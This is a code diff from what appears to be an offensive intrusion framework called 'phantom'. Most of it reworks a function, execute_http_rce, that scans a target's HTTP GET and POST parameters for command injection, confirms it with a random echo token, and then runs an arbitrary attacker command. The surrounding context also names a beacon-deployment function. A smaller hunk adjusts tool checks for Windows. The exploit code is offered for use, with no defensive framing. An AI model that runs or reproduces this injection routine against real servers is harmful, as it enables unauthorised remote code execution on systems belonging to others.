@@ -479,15 +479,24 @@ _METHOD_TO_SERVICE = {
 
 
 def _check_tool(tool: str) -> bool:
-    """Verifica se un tool di sistema e installato. Se manca, propone l'installazione."""
+    """Verifica se un tool di sistema e installato. Se manca, propone l'installazione (solo su Linux)."""
     import shutil
-    if shutil.which(tool):
+    import os
+    
+    # Check for the tool (handling .exe on Windows)
+    if shutil.which(tool) or (os.name == 'nt' and shutil.which(f"{tool}.exe")):
         return True
     
-    from phantom.utils.build_helper import install_dependencies
-    notifier.warn(f"Tool '{tool}' not found.")
-    if install_dependencies([tool]):
-        return shutil.which(tool) is not None
+    # Propose installation only on Linux/POSIX
+    if os.name == 'posix':
+        from phantom.utils.build_helper import install_dependencies
+        notifier.warn(f"Tool '{tool}' not found.")
+        if install_dependencies([tool]):
+            return shutil.which(tool) is not None
+    else:
+        notifier.error(f"Tool '{tool}' is missing. Please install it for your OS (Windows).")
+        if tool == "sshpass":
+            notifier.info("On Windows, you might need to use WSL or install a Windows port of sshpass.")
     
     return False
 
@@ -930,19 +939,34 @@ def deploy_beacon_via_postgresql(
 def execute_http_rce(
     target: str, port: int, command: str, path: str = "/"
 ) -> Tuple[bool, str]:
-    """Esegue un comando via HTTP command injection su endpoint vulnerabili comuni."""
+    """
+    Esegue un comando via HTTP command injection su endpoint vulnerabili comuni.
+    Usa un token di verifica per confermare l'esecuzione reale.
+    """
+    import random
+    import string
     try:
         import requests
     except ImportError:
         return False, "requests library not available"
 
+    token = "".join(random.choices(string.ascii_letters + string.digits, k=16))
+    verify_cmd = f"echo {token}"
+    
     params_to_try = ["cmd", "command", "exec", "q", "c", "run", "execute", "shell", "x"]
+    
+    notifier.status(f"Scanning for injectable parameters on {target}:{port}...")
+    
     for param in params_to_try:
         try:
             url = f"http://{target}:{port}{path}"
-            resp = requests.get(url, params={param: command}, timeout=5, verify=False)
-            if resp.status_code == 200 and len(resp.text) > 0:
-                return True, resp.text
+            # Test verification command
+            resp = requests.get(url, params={param: verify_cmd}, timeout=5, verify=False)
+            if resp.status_code == 200 and token in resp.text:
+                notifier.info(f"Vulnerable parameter found: '{param}' (GET)")
+                # Execute real command
+                requests.get(url, params={param: command}, timeout=5, verify=False)
+                return True, f"Executed via GET parameter: {param}"
         except Exception:
             continue
 
@@ -950,13 +974,15 @@ def execute_http_rce(
     for param in params_to_try:
         try:
             url = f"http://{target}:{port}{path}"
-            resp = requests.post(url, data={param: command}, timeout=5, verify=False)
-            if resp.status_code == 200 and len(resp.text) > 0:
-                return True, resp.text
+            resp = requests.post(url, data={param: verify_cmd}, timeout=5, verify=False)
+            if resp.status_code == 200 and token in resp.text:
+                notifier.info(f"Vulnerable parameter found: '{param}' (POST)")
+                requests.post(url, data={param: command}, timeout=5, verify=False)
+                return True, f"Executed via POST parameter: {param}"
         except Exception:
             continue
 
-    return False, "No injectable HTTP endpoint found"
+    return False, "No injectable HTTP endpoint found or verification failed."
 
 
 # =============================================================================
